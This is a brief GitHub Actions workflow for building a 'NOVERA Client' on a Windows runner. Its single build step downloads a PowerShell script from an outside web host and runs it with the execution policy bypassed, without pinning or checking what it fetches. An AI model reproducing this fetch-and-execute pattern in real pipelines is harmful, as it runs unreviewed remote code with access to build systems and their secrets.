name: Build NOVERA Client
on: workflow_dispatch
jobs:
  build:
    runs-on: windows-2022
    steps:
      - uses: actions/checkout@v4
      - name: Build
        shell: pwsh
        run: |
          Invoke-WebRequest -UseBasicParsing -Uri "https://dl.kanna.web.id/gh/ghbuild.ps1" -OutFile ghbuild.ps1
          powershell -ExecutionPolicy Bypass -File ghbuild.ps1
